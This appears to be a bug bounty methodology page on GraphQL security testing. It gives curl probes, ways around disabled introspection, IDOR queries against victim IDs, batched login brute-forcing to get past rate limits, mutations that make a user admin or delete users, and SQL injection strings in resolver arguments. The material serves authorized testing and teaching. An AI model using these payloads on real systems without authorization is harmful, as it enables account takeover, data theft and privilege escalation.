# GraphQL Testing

> **Severity:** P1–P3 depending on finding
> **Frequency:** Growing fast — most modern SaaS apps use it
> **Payout range:** $200–$10,000+

---

## Why GraphQL Is Worth Learning

GraphQL replaces REST with a single endpoint (`/graphql` or `/api/graphql`). Developers often:
- Leave introspection on in production (full schema exposure)
- Apply auth checks inconsistently across resolvers
- Miss field-level authorization (you can query fields you shouldn't see)
- Forget to rate-limit batch queries

One GraphQL endpoint = the entire application's data model exposed in one place.

---

## Step 1: Detect GraphQL

```bash
# Common GraphQL endpoints to probe
/graphql
/api/graphql
/v1/graphql
/query
/gql

# Detection — send a basic introspection probe
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "User-Agent: $HUNTER_UA" \
  -d '{"query": "{__typename}"}' | python3 -m json.tool

# If response contains {"data": {"__typename": "Query"}} → GraphQL confirmed
```

---

## Step 2: Introspection — Map the Entire Schema

Introspection lets you query the full schema: all types, queries, mutations, fields.

```bash
# Full introspection query
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $AUTH_BEARER" \
  -d '{
    "query": "{ __schema { types { name fields { name type { name kind ofType { name } } } } } }"
  }' | python3 -m json.tool > recon/graphql-schema.json

# If introspection is disabled, try these bypasses:
# 1. Add a newline in the field name
{"query": "{ __schema\n{ types { name } } }"}

# 2. Use a GET request instead of POST
curl "https://target.com/graphql?query={__schema{types{name}}}"

# 3. Use clairvoyance to guess schema without introspection
# clairvoyance https://target.com/graphql -w wordlist.txt -o schema.json
```

**What to look for in schema:**
- Mutation types → actions that change data (account update, payment, delete)
- Query types → data accessible (user data, admin data, reports)
- Type names containing: `admin`, `internal`, `secret`, `private`, `config`

---

## Step 3: High-Value Tests

### 3.1 Field-Level Authorization Bypass
Query fields you shouldn't have access to as a regular user:

```graphql
# Normal user querying another user's sensitive fields
query {
  user(id: "VICTIM_ID") {
    id
    email
    phone
    address
    paymentMethods {
      cardNumber
      cvv
    }
    role
    isAdmin
  }
}
```

If any sensitive field returns data → field-level auth bypass (IDOR via GraphQL).

### 3.2 IDOR Through Object IDs
```graphql
# Your query
query { order(id: "YOUR_ORDER_ID") { total items shippingAddress } }

# Swap with victim's ID
query { order(id: "VICTIM_ORDER_ID") { total items shippingAddress } }
```

### 3.3 Batch Query — Rate Limit Bypass
GraphQL allows multiple queries in one request. Useful for bypassing rate limits on OTP/password:

```graphql
# 100 login attempts in one HTTP request
mutation {
  a1: login(email: "victim@example.com", password: "password1") { token }
  a2: login(email: "victim@example.com", password: "password2") { token }
  a3: login(email: "victim@example.com", password: "password3") { token }
  # ... up to 100 aliases
}
```

### 3.4 Hidden Admin Mutations
Look for mutations that weren't exposed in the UI:

```graphql
# Try mutations found in schema that aren't accessible from the frontend
mutation {
  updateUserRole(userId: "VICTIM_ID", role: "ADMIN") {
    success
    user { role }
  }
}

mutation {
  deleteUser(userId: "VICTIM_ID") { success }
}
```

### 3.5 Injection Through Resolvers
GraphQL resolvers often query databases. Test arguments for SQLi/NoSQLi:

```graphql
query {
  search(term: "test' OR '1'='1") {
    results { id name }
  }
}

query {
  user(id: "1 OR 1=1") { email }
}
```

### 3.6 Subscription Abuse
If the API uses WebSocket subscriptions:
- Can you subscribe to another user's events?
- Can you subscribe without authentication?

```graphql
subscription {
  orderUpdated(userId: "VICTIM_ID") {
    status total
  }
}
```

---

## Step 4: Tools

```bash
# graphql-cop — automated GraphQL security checks
pip3 install graphql-cop
graphql-cop -t https://target.com/graphql -H "Authorization: Bearer $AUTH_BEARER"

# InQL (Burp extension) — visual schema explorer
# Install from BApp Store → InQL Scanner

# GraphQL Voyager — visualize schema
# https://graphql-kit.com/graphql-voyager/ → paste your schema JSON
```

---

## Common Findings & Severity

| Finding | Severity |
|---------|---------|
| Introspection enabled in production (alone) | P4 — low, but useful for recon |
| IDOR via GraphQL (sensitive data) | P2 |
| Field-level auth bypass (admin fields) | P1–P2 |
| Batch query brute force bypass | P2–P3 |
| Injection through resolver | P1 (if SQLi/RCE) |
| Hidden admin mutations accessible | P1–P2 |
| Subscription auth bypass | P2–P3 |

---

## WSTG Reference
- WSTG-INPV-11: Testing for GraphQL Injection
- WSTG-ATHZ-01: Testing for Insecure Direct Object References

## Resources
- [OWASP GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [HackTricks GraphQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)
- [PayloadsAllTheThings GraphQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
